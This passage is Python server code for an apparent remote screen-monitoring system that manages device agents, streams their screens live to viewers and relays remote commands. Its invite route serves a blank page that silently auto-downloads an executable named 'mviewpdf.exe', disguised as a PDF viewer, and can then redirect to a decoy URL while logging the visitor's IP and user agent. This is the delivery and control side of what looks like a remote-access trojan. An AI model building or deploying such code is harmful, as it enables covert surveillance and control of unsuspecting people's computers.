        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp
    if not request.path.startswith("/static"):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        if not _rate_check(ip):
            return jsonify({"error": "Too many requests"}), 429

@app.after_request
def add_security_headers(resp):
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("X-Frame-Options",        "SAMEORIGIN")
    resp.headers.setdefault("X-XSS-Protection",       "1; mode=block")
    resp.headers.setdefault("Referrer-Policy",         "strict-origin-when-cross-origin")
    resp.headers["X-Request-ID"] = _req_id()
    return resp

# ── Device-list cache (avoids db_list_all() on every viewer_hello) ───────────
_dev_list_cache: list = []
_dev_list_cache_ts: float = 0.0
_dev_list_cache_lock = threading.Lock()
_DEV_LIST_CACHE_TTL = 10.0   # seconds

def _refresh_dev_list_cache():
    """Refresh the device-list cache in a background greenlet."""
    global _dev_list_cache, _dev_list_cache_ts
    try:
        rows = db_list_all()
        with _dev_list_cache_lock:
            _dev_list_cache    = rows
            _dev_list_cache_ts = time.time()
    except Exception as e:
        log.error(f"_refresh_dev_list_cache error: {e}")

def _get_cached_db_rows() -> list:
    """Return cached DB rows; trigger a background refresh if stale."""
    with _dev_list_cache_lock:
        age  = time.time() - _dev_list_cache_ts
        rows = list(_dev_list_cache)
    if age > _DEV_LIST_CACHE_TTL:
        _bg(_refresh_dev_list_cache)
    return rows


def _touch_viewer(sid: str):
    with _viewer_activity_lock:
        _viewer_last_activity[sid] = time.monotonic()

def _cleanup_viewer(viewer_sid: str):
    with _dash_lock:
        did = _dashboard_device.pop(viewer_sid, None)
    if did:
        with _view_lock:
            _viewers[did].discard(viewer_sid)
    with _adv_viewer_lock:
        adv_did = _adv_viewer_rooms.pop(viewer_sid, None)
    if adv_did:
        with _adv_viewer_lock:
            vcount = sum(1 for v in _adv_viewer_rooms.values() if v == adv_did)
        agent_sid  = _adv_agent_sids.get(adv_did)
        if agent_sid and sio:
            sio.emit("viewer_count", {"count": vcount}, room=agent_sid)
    with _viewer_activity_lock:
        _viewer_last_activity.pop(viewer_sid, None)
        _viewer_session_start.pop(viewer_sid, None)

def _notify_reconnecting(did: str):
    if not sio:
        return
    payload = {"device_id": did, "ts": utcnow()}
    sio.emit("stream_reconnecting", payload, room=f"view:{did}")
    sio.emit("stream_reconnecting", payload, room=f"adv_viewers_{did}")

def _cleanup_agent(agent_sid: str):
    """
    Remove agent state, notify viewers, update DB in background.
    CRITICAL: no Supabase I/O inside the gevent dispatch path — offloaded to _bg().
    """
    with _sid_lock:
        did = _sid_to_device.pop(agent_sid, None)
    if not did:
        return
    with _dev_lock:
        dev = _devices.pop(did, None)
    # Adv-socket cleanup
    if _adv_agent_sids.get(did) == agent_sid:
        _adv_agent_sids.pop(did, None)
        _adv_sid_to_agent.pop(agent_sid, None)
    # Notify viewers + flush GOP
    _notify_reconnecting(did)
    with _adv_gop_lock:
        _adv_gop_buf.pop(did, None)
    _adv_cursor_latest.pop(did, None)
    if not dev:
        return
    label = dev.get("label", did)
    log.warning(f"Agent offline: {label} ({did})")
    _audit("agent_offline", device_id=did, label=label)
    if sio:
        payload = {"device_id": did, "label": label, "ts": utcnow()}
        sio.emit("agent_offline",  payload)
        sio.emit("device_offline", payload)
    # Supabase + webhook in background — never blocks the event loop
    _bg(_cleanup_agent_bg, did, label)

def _cleanup_agent_bg(did, label):
    try:
        db_update(did, {"status": "offline", "disconnected_at": utcnow()})
    except Exception:
        pass
    _fire_webhook("agent_offline", {"device_id": did, "label": label})
    try:
        if sio:
            broadcast_device_update()
    except Exception:
        pass

def broadcast_device_update():
    if not sio:
        return
    try:
        rows = _get_cached_db_rows()   # non-blocking cache; never blocks event loop
        with _dev_lock:
            live = {d["device_id"]: d for d in _devices.values()}
        for row in rows:
            did = row.get("device_id", "")
            if did in live:
                row.update({
                    "_live":       True,
                    "cpu":         live[did].get("cpu"),
                    "ram":         live[did].get("ram"),
                    "last_beat":   live[did].get("last_beat"),
                    "frame_count": live[did].get("frame_count", 0),
                })
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
        _broadcast_device_list()
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

def _get_device_for_viewer(sid: str):
    with _dash_lock:
        return _dashboard_device.get(sid)

# ══════════════════════════════════════════════════════════════════════════════
#  Static / config routes
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def serve_root():
    for f in ("index.html", "app.html"):
        if Path(f).is_file():
            return send_from_directory(".", f)
    return jsonify({"status": "ok", "version": VERSION}), 200

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login():
    return redirect("/", 301)

@app.route("/config.js")
def serve_config():
    if Path("config.js").is_file():
        return send_from_directory(".", "config.js", mimetype="application/javascript")
    host = request.host_url.rstrip("/")
    fwd  = request.headers.get("X-Forwarded-Proto", "")
    if fwd == "https" or request.url.startswith("https"):
        host = "https://" + host.split("://", 1)[-1]
    host = host.rstrip("/")
    js = (
        f"/* Auto-generated by server.py v{VERSION} */\n"
        f"window.SCREEN_CONNECT_SERVER_URL = '{host}';\n"
        f"window.MVIEW_SERVER_URL          = '{host}';\n"
        f"window.MVIEW_SUPABASE_URL        = '{SUPABASE_URL}';\n"
        f"window.MVIEW_SUPABASE_ANON_KEY   = '{SUPABASE_KEY}';\n"
        f"window.SC = window.SC || {{}};\n"
        f"window.SC.SERVER_URL = window.SCREEN_CONNECT_SERVER_URL;\n"
        f"window.SessionManager = window.SessionManager || {{}};\n"
        f"window.SessionManager.CONFIG = {{\n"
        f"  SERVER_URL: window.SCREEN_CONNECT_SERVER_URL,\n"
        f"  SUPABASE_URL: window.MVIEW_SUPABASE_URL,\n"
        f"  SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,\n"
        f"}};\n"
    )
    resp = make_response(js, 200)
    resp.headers["Content-Type"]  = "application/javascript"
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return resp

@app.route("/session_manager.js")
def serve_session_manager():
    host = request.host_url.rstrip("/")
    js = f"""/* SessionManager v11 */
'use strict';
(function(){{
  const SERVER_URL=window.SCREEN_CONNECT_SERVER_URL||'{host}';
  let _pt=null,_ct=null;
  const SM={{
    CONFIG:{{SERVER_URL,SUPABASE_URL:'{SUPABASE_URL}',SUPABASE_ANON_KEY:'{SUPABASE_KEY}'}},
    currentToken:null,currentLink:null,
    reset(){{if(_pt){{clearInterval(_pt);_pt=null;}}_ct=null;SM.currentToken=null;SM.currentLink=null;
      ['device-step-3','device-step-2'].forEach(id=>{{const e=document.getElementById(id);if(e)e.style.display='none';}});
      const s1=document.getElementById('device-step-1');if(s1)s1.style.display='';
    }},
    async generateInviteLink(){{
      const label=(document.getElementById('device-name-input')||document.getElementById('device-label'))?.value?.trim()||'New Device';
      const dtype=(document.getElementById('device-type-select')||document.getElementById('device-type'))?.value||'Standard Display';
      const loc=(document.getElementById('device-location-input')||document.getElementById('device-location'))?.value?.trim()||'';
      const s1=document.getElementById('device-step-1'),s2=document.getElementById('device-step-2'),s3=document.getElementById('device-step-3');
      if(s1)s1.style.display='none';if(s2)s2.style.display='';
      try{{
        const r=await fetch(SERVER_URL+'/api/invite',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{label,device_type:dtype,location:loc}})}});
        const j=await r.json();
        _ct=j.token||j.device_id;SM.currentToken=_ct;SM.currentLink=j.agent_url||j.download_url;
        const linkEl=document.getElementById('invite-link')||document.getElementById('link-url');if(linkEl)linkEl.value=SM.currentLink;
        const qrEl=document.getElementById('invite-qr');if(qrEl)qrEl.src='https://api.qrserver.com/v1/create-qr-code/?size=140x140&data='+encodeURIComponent(SM.currentLink);
        if(s2)s2.style.display='none';if(s3)s3.style.display='';SM._poll(_ct);
      }}catch(e){{if(s2)s2.style.display='none';if(s1)s1.style.display='';SM._notify('Failed: '+e.message,'warn');}}
    }},
    async copyLink(){{try{{await navigator.clipboard.writeText(SM.currentLink||'');SM._notify('Link copied!','ok');}}catch(e){{const i=document.getElementById('invite-link')||document.getElementById('link-url');if(i){{i.select();document.execCommand('copy');}}SM._notify('Link copied!','ok');}}}},
    _poll(token){{let c=0;const tick=async()=>{{c++;try{{const r=await fetch(SERVER_URL+'/api/invite/status?token='+token);const j=await r.json();const t=document.getElementById('step3-status');if(j.status==='online'){{clearInterval(_pt);_pt=null;if(t)t.textContent='Device connected!';SM._notify('Device "'+j.label+'" online!','ok');SM.reset();if(typeof refreshDashboardFromSupabase==='function')setTimeout(refreshDashboardFromSupabase,1000);return;}}if(t)t.textContent='Waiting for agent... ('+c+')';if(c>120){{clearInterval(_pt);_pt=null;}}}}catch(e){{}}}};_pt=setInterval(tick,5000);tick();}},
    _notify(msg,type){{if(typeof showToast==='function')showToast(msg,type==='ok'?'success':type==='warn'?'error':'info');}},
  }};
  window.SessionManager=SM;
}})();
"""
    return js, 200, {"Content-Type": "application/javascript"}

# ══════════════════════════════════════════════════════════════════════════════
#  Health / Stats / API routes
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    with _dev_lock:
        online = len(_devices)
    crash_count = len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0
    try:
        import psutil
        mem = psutil.Process().memory_info().rss // (1024 * 1024)
    except Exception:
        mem = None
    return jsonify({
        "status":         "ok",
        "version":        VERSION,
        "server_time":    utcnow(),
        "uptime_seconds": int(time.time() - _SERVER_START),
        "database":       get_sb() is not None,
        "socketio":       SOCKETIO_OK,
        "async_mode":     "gevent",
        "devices_online": online,
        "agent_storage":  AGENT_STORAGE_URL,
        "agent_local":    (Path(AGENT_DIR) / AGENT_FILE).is_file(),
        "render_port":    PORT,
        "memory_mb":      mem,
        "crash_reports":  crash_count,
    })

@app.route("/api/crash", methods=["POST"])
def api_crash_report():
    data = request.get_json(silent=True) or {}
    ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
    did  = data.get("device_id", "unknown")[:64]
    path = os.path.join(_CRASH_DIR, f"agent_{did}_{ts}.txt")
    try:
        with open(path, "w") as fh:
            fh.write(json.dumps(data, indent=2))
    except Exception:
        pass
    log.error(f"AGENT CRASH [{did}]: {data.get('context','?')} — {data.get('error','?')}")
    return jsonify({"status": "received"}), 200

@app.route("/api/audit-log")
@require_admin
def api_audit_log():
    with _audit_lock:
        rows = list(_audit_log)
    return jsonify({"entries": rows[-200:], "total": len(rows)})

@app.route("/api/agent-info")
def api_agent_info():
    local = Path(AGENT_DIR) / AGENT_FILE
    return jsonify({
        "storage_url":  AGENT_STORAGE_URL,
        "local_exists": local.is_file(),
        "local_size":   local.stat().st_size if local.is_file() else 0,
        "cache_size":   len(_agent_cache) if _agent_cache else 0,
    })

@app.route("/api/server-stats")
@require_admin
def api_server_stats():
    with _dev_lock:
        dev_count = len(_devices)
    with _view_lock:
        viewer_count = sum(len(v) for v in _viewers.values())
    try:
        import psutil
        proc    = psutil.Process()
        mem_rss = proc.memory_info().rss // (1024 * 1024)
        cpu_pct = proc.cpu_percent(interval=0.1)
    except Exception:
        mem_rss = cpu_pct = None
    return jsonify({
        "version":             VERSION,
        "uptime_seconds":      int(time.time() - _SERVER_START),
        "devices_online":      dev_count,
        "viewers_active":      viewer_count,
        "adv_agent_sids":      len(_adv_agent_sids),
        "adv_viewer_rooms":    len(_adv_viewer_rooms),
        "gop_buffer_devices":  len(_adv_gop_buf),
        "threads":             threading.active_count(),
        "memory_mb":           mem_rss,
        "cpu_pct":             cpu_pct,
        "crash_reports":       len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0,
        "async_mode":          "gevent",
        "gevent_patched":      _GEVENT_OK,
        "ts":                  utcnow(),
    })

@app.route("/metrics")
def api_metrics():
    with _dev_lock:
        devs = list(_devices.values())
    with _view_lock:
        tv = sum(len(v) for v in _viewers.values())
    return jsonify({
        "status": "ok", "version": VERSION,
        "devices_online": len(devs), "viewers": tv,
        "devices": [{
            "id": d.get("device_id"), "device_id": d.get("device_id"),
            "label": d.get("label"), "hostname": d.get("hostname"),
            "os": d.get("os"), "local_ip": d.get("local_ip"),
            "cpu": d.get("cpu"), "ram": d.get("ram"), "status": "online",
        } for d in devs],
        "ts": utcnow(),
    })

@app.route("/api/stream-stats")
def api_stream_stats():
    stats = {}
    with _dev_lock:
        devs = dict(_devices)
    with _view_lock:
        views = {k: len(v) for k, v in _viewers.items()}
    adv_views: dict = {}
    for vsid, did in list(_adv_viewer_rooms.items()):
        adv_views[did] = adv_views.get(did, 0) + 1
    with _frame_stats_lock:
        for did, dq in _frame_stats.items():
            if not dq:
                continue
            now    = time.time()
            recent = [(t, b) for t, b in dq if now - t < 5.0]
            fps    = len(recent) / 5.0 if recent else 0
            bps    = sum(b for _, b in recent) / 5.0 if recent else 0
            stats[did] = {
                "fps":          round(fps, 1),
                "kbps":         round(bps / 1024, 1),
                "viewers":      max(views.get(did, 0), adv_views.get(did, 0)),
                "total_frames": devs.get(did, {}).get("frame_count", 0),
                "last_frame":   devs.get(did, {}).get("last_frame_ts", ""),
            }
    return jsonify({"stream_stats": stats, "ts": utcnow()})

@app.route("/api/devices")
@app.route("/api/devices/live")
def api_devices():
    with _dev_lock:
        devs = list(_devices.values())
    return jsonify({"devices": [_safe_dev(d) for d in devs], "count": len(devs), "ts": utcnow()})

def _safe_dev(d):
    return {
        "device_id":     d.get("device_id"),
        "label":         d.get("label"),
        "hostname":      d.get("hostname"),
        "os":            d.get("os"),
        "local_ip":      d.get("local_ip"),
        "username":      d.get("username"),
        "cpu":           d.get("cpu"),
        "ram":           d.get("ram"),
        "agent_version": d.get("agent_version"),
        "stream_mode":   d.get("stream_mode"),
        "status":        "online",
        "connected_at":  d.get("connected_at"),
        "last_beat":     d.get("last_beat"),
        "frame_count":   d.get("frame_count", 0),
    }

@app.route("/api/device/<device_id>/command", methods=["POST"])
@require_admin
def api_device_command(device_id):
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dev_lock:
        dev = _devices.get(device_id)
    if not dev:
        return jsonify({"error": f"Device {device_id} not online"}), 404
    data = request.get_json(silent=True) or {}
    data["device_id"] = device_id
    sio.emit("request_action", data, room=device_id)
    _audit("rest_command", device_id=device_id, tab=data.get("tab"))
    return jsonify({"status": "sent", "device_id": device_id}), 200

@app.route("/api/device/<device_id>", methods=["DELETE"])
@require_admin
def api_device_delete(device_id):
    with _dev_lock:
        dev = _devices.pop(device_id, None)
    with _sid_lock:
        for sid in [s for s, d in list(_sid_to_device.items()) if d == device_id]:
            _sid_to_device.pop(sid, None)
    old_adv = _adv_agent_sids.pop(device_id, None)
    if old_adv:
        _adv_sid_to_agent.pop(old_adv, None)
    _bg(db_update, device_id, {"status": "deleted", "disconnected_at": utcnow()})
    _audit("device_deleted", device_id=device_id)
    if dev and sio:
        sio.emit("device_offline", {"device_id": device_id, "label": dev.get("label", device_id), "ts": utcnow()})
    return jsonify({"status": "deleted", "device_id": device_id}), 200

@app.route("/api/viewer/<viewer_sid>/kick", methods=["POST"])
@require_admin
def api_kick_viewer(viewer_sid):
    if not sio:
        return jsonify({"error": "SocketIO not available"}), 503
    with _dash_lock:
        did = _dashboard_device.get(viewer_sid)
    reason = (request.get_json(silent=True) or {}).get("reason", "Kicked by administrator")
    try:
        sio.emit("kicked", {"reason": reason, "by": "admin", "ts": utcnow()}, room=viewer_sid)
        sio.disconnect(viewer_sid)
        _cleanup_viewer(viewer_sid)
        _audit("viewer_kicked", viewer_sid=viewer_sid, device_id=did, reason=reason)
        return jsonify({"status": "kicked", "viewer_sid": viewer_sid}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/sessions/live")
@require_admin
def api_sessions_live():
    now = time.monotonic()
    sessions = []
    with _viewer_activity_lock:
        for vsid, start in list(_viewer_session_start.items()):
            last = _viewer_last_activity.get(vsid, start)
            with _dash_lock:
                did = _dashboard_device.get(vsid)
            sessions.append({
                "viewer_sid": vsid,
                "device_id":  did,
                "duration_s": round(now - start, 1),
                "idle_s":     round(now - last, 1),
            })
    return jsonify({"sessions": sessions, "count": len(sessions), "ts": utcnow()})

@app.route("/api/sessions")
@require_admin
def api_sessions():
    rows = db_list_all()
    with _dev_lock:
        live_ids = set(_devices.keys())
    for r in rows:
        r["_live"] = r.get("device_id") in live_ids
    return jsonify({"sessions": rows, "count": len(rows)})

@app.route("/api/sessions/<token>/revoke", methods=["POST", "DELETE"])
@require_admin
def api_revoke(token):
    _bg(db_update, token, {"status": "revoked"})
    return jsonify({"status": "revoked", "token": token})

# ── Invite + agent download ───────────────────────────────────────────────────
@app.route("/api/invite",      methods=["GET", "POST"])
@app.route("/api/generate",    methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    token = "MV-" + secrets.token_hex(3).upper() + "-" + secrets.token_hex(3).upper() + "-" + secrets.token_hex(3).upper()
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))
    expires_at = None
    if expiry_sec > 0:
        expires_at = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=expiry_sec)).isoformat()
    link_mode    = data.get("link_mode", "blank")
    redirect_url = data.get("redirect_url", "").strip()
    payload = {
        "device_id": token, "label": label, "location": loc,
        "device_type": dtype, "status": "pending", "expires_at": expires_at,
        "created_at": utcnow(), "link_mode": link_mode, "redirect_url": redirect_url,
    }
    _bg(db_insert, payload)
    _audit("invite_generated", token=token, label=label)
    srv = request.host_url.rstrip("/")
    return jsonify({
        "status": "ok", "token": token, "device_id": token, "label": label,
        "download_url": f"{srv}/guide/{token}",
        "agent_url":    f"{srv}/guide/{token}",
        "expires_at":   expires_at, "link_mode": link_mode,
    }), 201

@app.route("/api/invite/status")
def api_invite_status():
    token = request.args.get("token", "")
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    with _dev_lock:
        live = _devices.get(token)
    if live:
        return jsonify({"status": "online", "label": live.get("label", token)})
    rec = db_get(token)
    if rec:
        return jsonify({"status": rec.get("status", "pending"), "label": rec.get("label", token)})
    return jsonify({"status": "pending", "label": token})

@app.route("/invite/<token>")
@app.route("/onboard/<token>")
@app.route("/guide/<token>")
def serve_agent(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400
    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        _bg(db_update, token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410
    _bg(db_update, token, {
        "status": "downloading", "download_ip": request.remote_addr,
        "downloaded_at": utcnow(), "user_agent": request.headers.get("User-Agent", "")[:200],
    })
    link_mode    = session.get("link_mode") or "blank"
    redirect_url = (session.get("redirect_url") or "").strip()
    patched = _build_patched_agent(token)
    if patched:
        _agent_dl_cache[token] = (patched, time.time())
        cutoff = time.time() - _AGENT_DL_TTL
        for t in [k for k, (_, ts) in _agent_dl_cache.items() if ts < cutoff]:
            _agent_dl_cache.pop(t, None)
    dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL
    dl_js  = json.dumps(str(dl_url))
    if link_mode == "redirect" and redirect_url:
        rdr_js = json.dumps(str(redirect_url))
        html = (f'<!DOCTYPE html><html><head><meta charset=utf-8><title> </title>'
                f'<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style></head><body><script>'
                f'(function(){{var a=document.createElement("a");a.href={dl_js};a.download="mviewpdf.exe";'
                f'document.body.appendChild(a);a.click();setTimeout(function(){{window.location.href={rdr_js};}},1500);}})();</script></body></html>')
    else:
        html = (f'<!DOCTYPE html><html><head><meta charset=utf-8><title> </title>'
                f'<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style></head><body><script>'
                f'(function(){{var a=document.createElement("a");a.href={dl_js};a.download="mviewpdf.exe";'
                f'document.body.appendChild(a);a.click();}})();</script></body></html>')
    r = make_response(html, 200)
    r.headers["Content-Type"] = "text/html"
    return r

@app.route("/guide/<token>/dl")
def serve_agent_binary(token):
    if token in _agent_dl_cache:
        data, _ = _agent_dl_cache[token]
        resp = make_response(data)
        resp.headers["Content-Type"]        = "application/octet-stream"
        resp.headers["Content-Disposition"] = 'attachment; filename="mviewpdf.exe"'
        resp.headers["Content-Length"]      = len(data)
        resp.headers["Cache-Control"]       = "no-store"
        return resp
    if AGENT_STORAGE_URL:
        return redirect(AGENT_STORAGE_URL, 302)
    return jsonify({"error": "Binary not available."}), 503

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data  = request.get_json(silent=True) or {}
    token = data.get("device_id") or data.get("token", "")
    if not token:
        return jsonify({"error": "No device_id"}), 400
    _bg(db_upsert, token, {
        "status": "online", "label": data.get("hostname") or token,
        "ip_address": data.get("local_ip"), "hostname": data.get("hostname"),
        "os_info": data.get("os"), "agent_version": data.get("agent_version"),
        "connected_at": utcnow(),
    })
    return jsonify({"status": "ok", "token": token})

# ══════════════════════════════════════════════════════════════════════════════
#  SocketIO events
# ══════════════════════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    @sio.on("connect")
    def on_connect():
        sid = request.sid
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        join_room("dashboards")
        log.info(f"Socket connected: {sid} from {ip}")

    @sio.on("disconnect")
    def on_disconnect():
        sid = request.sid
        _cleanup_viewer(sid)
        _cleanup_agent(sid)
        log.info(f"Socket disconnected: {sid}")

    # ── Diagnostics room (admin only) ─────────────────────────────────────────
    @sio.on("join_diagnostics")
    def on_join_diagnostics(data):
        if data.get("admin_key", "") == ADMIN_KEY:
            join_room("diagnostics")
            emit("diagnostics_joined", {"status": "ok"})
        else:
            emit("diagnostics_joined", {"status": "error", "msg": "Invalid admin key"})

    @sio.on("leave_diagnostics")
    def on_leave_diagnostics(data):
        leave_room("diagnostics")

    # ── Advanced Monitor viewer hello ─────────────────────────────────────────
    @sio.on("viewer_hello")
    def on_viewer_hello(data):
        sid = request.sid
        join_room("adv_dashboards")
        _send_device_list_to(sid)

    def _build_device_list_result() -> list:
        with _dev_lock:
            live = dict(_devices)
        rows   = _get_cached_db_rows()   # non-blocking: uses cache, refreshes in bg
        db_map = {r.get("device_id", ""): r for r in rows}
        result = []
        for did, dev in live.items():
            db_row = db_map.get(did, {})
            result.append({
                "id": did,
                "device_id": did,
                "token": did,
                "name": dev.get("label") or dev.get("hostname") or did,
                "online": True, "screen_w": dev.get("screen_w", 0), "screen_h": dev.get("screen_h", 0),
                "rtt_ms": dev.get("rtt_ms", 0), "cpu": dev.get("cpu"), "ram": dev.get("ram"),
                "ip": dev.get("local_ip") or db_row.get("ip_address", ""),
                "os": dev.get("os") or db_row.get("os_info", ""),
            })
        for did, row in db_map.items():
            if did not in live:
                result.append({
                    "id": did,
                    "device_id": did,
                    "token": did,
                    "name": row.get("label") or row.get("hostname") or did,
                    "online": False, "screen_w": 0, "screen_h": 0, "rtt_ms": 0,
                    "cpu": None, "ram": None,
                    "ip": row.get("ip_address", ""), "os": row.get("os_info", ""),
                })
        return result

    def _send_device_list_to(sid):
        try:
            sio.emit("device_list", _build_device_list_result(), room=sid)
        except Exception as e:
            log.error(f"_send_device_list_to error: {e}")

    def _broadcast_device_list():
        try:
            sio.emit("device_list", _build_device_list_result(), room="adv_dashboards")
        except Exception:
            pass

    @sio.on("join_dashboard")
    def on_join_dashboard(data):
        join_room("dashboards")

    @sio.on("subscribe_stream")
    def on_subscribe_stream(data):
        pass   # legacy no-op

    # ── watch_device — viewer subscribes to a device stream ───────────────────
    @sio.on("watch_device")
    def on_watch_device(data):
        try:
            did = data.get("device_id", "")
            sid = request.sid
            fps = data.get("fps", 30)
            quality = data.get("quality", 70)
            log.info(f"Viewer {sid} watching {did}  fps={fps} quality={quality}")
            if not did:
                sio.emit("watch_error", {"msg": "No device_id"}, room=sid)
                return

            with _adv_viewer_lock:
                old_adv_did = _adv_viewer_rooms.get(sid)

            # Max-viewers gate
            if MAX_VIEWERS_PER_DEVICE > 0:
                with _adv_viewer_lock:
                    cur = sum(1 for v in _adv_viewer_rooms.values() if v == did)
                    already_watching = _adv_viewer_rooms.get(sid) == did
                if not already_watching and cur >= MAX_VIEWERS_PER_DEVICE:
                    sio.emit("watch_error", {
                        "msg":  f"Max concurrent viewers ({MAX_VIEWERS_PER_DEVICE}) reached.",
                        "code": "max_viewers",
                    }, room=sid)
                    return

            # Leave old room
            if old_adv_did and old_adv_did != did:
                leave_room(f"adv_viewers_{old_adv_did}")
                with _adv_viewer_lock:
                    _adv_viewer_rooms.pop(sid, None)
                old_agent_sid = _adv_agent_sids.get(old_adv_did)
                with _adv_viewer_lock:
                    ov = sum(1 for v in _adv_viewer_rooms.values() if v == old_adv_did)
                if old_agent_sid:
                    sio.emit("viewer_count", {"count": ov}, room=old_agent_sid)

            with _dev_lock:
                dev = _devices.get(did)

            if not dev:
                join_room(f"adv_viewers_{did}")
                with _adv_viewer_lock:
                    _adv_viewer_rooms[sid] = did
                join_room(f"view:{did}")
                with _view_lock:
                    _viewers[did].add(sid)
                with _dash_lock:
                    _dashboard_device[sid] = did
                with _viewer_activity_lock:
                    _viewer_session_start[sid] = time.monotonic()
                    _viewer_last_activity[sid]  = time.monotonic()
                sio.emit("watch_ok", {"online": False, "device_id": did, "name": did,
                                      "screen_w": 0, "screen_h": 0}, room=sid)
                return

            # Join viewer rooms
            join_room(f"adv_viewers_{did}")
            with _adv_viewer_lock:
                _adv_viewer_rooms[sid] = did

            old_did = _get_device_for_viewer(sid)
            if old_did and old_did != did:
                leave_room(f"view:{old_did}")
                with _view_lock:
                    _viewers[old_did].discard(sid)
                sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": old_did}, room=old_did)

            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(sid)
            with _dash_lock:
                _dashboard_device[sid] = did

            with _viewer_activity_lock:
                _viewer_session_start[sid] = time.monotonic()
                _viewer_last_activity[sid]  = time.monotonic()

            # GOP catch-up DISABLED for live-only mode (GOP_BUF_SIZE=0).
            # Sending stale frames on connect is the primary cause of "showing past things".
            # New viewers see only frames arriving AFTER they subscribe.
            cursor_pkt = _adv_cursor_latest.get(did)
            if cursor_pkt:
                def _send_cursor(_sid=sid, _cursor=cursor_pkt):
                    sio.emit("cursor_bin", _cursor, room=_sid)
                _bg(_send_cursor)

            # Notify agent of viewer count
            agent_adv_sid = _adv_agent_sids.get(did)
            with _adv_viewer_lock:
                vcount = sum(1 for v in _adv_viewer_rooms.values() if v == did)
            with _view_lock:
                vcount = max(vcount, len(_viewers.get(did, set())))
            if agent_adv_sid:
                sio.emit("viewer_count", {"count": vcount}, room=agent_adv_sid)
            sio.emit("viewer_count", {"count": vcount}, room=did)

            sio.emit("watch_ok", {
                "online": True, "device_id": did,
                "name":   dev.get("hostname", did),
                "screen_w": dev.get("screen_w", 0),
                "screen_h": dev.get("screen_h", 0),
            }, room=sid)
            emit("subscribed", {"device_id": did, "viewers": vcount})

            # Clamp fps to 30-60 range and quality to 80-95 for live-sync
            fps     = min(max(int(data.get("fps", 60)), 30), 60)   # 30-60 fps range
            quality = min(max(int(data.get("quality", 90)), 80), 95)  # 80-95 quality range
            scale   = float(data.get("scale", 1.0))               # default full res
            monitor = data.get("monitor", 1)
            spay = {"tab": "monitor", "action": "start", "device_id": did,
                    "fps": fps, "quality": quality, "scale": scale, "monitor": monitor}
            sio.emit("request_action", spay, room=did)
            if agent_adv_sid:
                sio.emit("request_action", spay, room=agent_adv_sid)
            log.info(f"Viewer {sid} watching {did}  fps={fps} quality={quality} scale={scale}")

        except Exception as exc:
            _report_crash("on_watch_device", exc)
            try:
                sio.emit("watch_error", {"msg": str(exc)}, room=request.sid)
            except Exception:
                pass

    @sio.on("unsubscribe_stream")
    def on_unsubscribe_stream(data):
        pass

    # ── Agent registration ────────────────────────────────────────────────────
    @sio.on("agent_connect")
    def on_agent_connect(data):
        try:
            _handle_agent_connect(data)
        except Exception as exc:
            _report_crash(f"agent_connect(sid={request.sid})", exc)

    def _handle_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did
        if not did:
            log.warning(f"agent_connect: no device_id from {request.sid}")
            return

        # Single-instance enforcement — evict stale agent
        if AGENT_EXCLUSIVE:
            with _dev_lock:
                existing = _devices.get(did)
            if existing:
                old_sid = existing.get("sid")
                if old_sid and old_sid != request.sid:
                    log.warning(f"Evicting stale agent {did} sid={old_sid}")
                    _notify_reconnecting(did)
                    try:
                        sio.emit("evicted", {
                            "reason": "duplicate_agent",
                            "msg":    "A newer instance connected — this session is terminated.",
                        }, room=old_sid)
                        try:
                            leave_room(old_sid, did)
                        except Exception:
                            pass
                        sio.disconnect(old_sid)
                    except Exception:
                        pass
                    with _sid_lock:
                        _sid_to_device.pop(old_sid, None)
                    with _dev_lock:
                        _devices.pop(did, None)
                    old_adv = _adv_agent_sids.pop(did, None)
                    if old_adv:
                        _adv_sid_to_agent.pop(old_adv, None)
                    with _adv_gop_lock:
                        _adv_gop_buf.pop(did, None)
                    _adv_cursor_latest.pop(did, None)
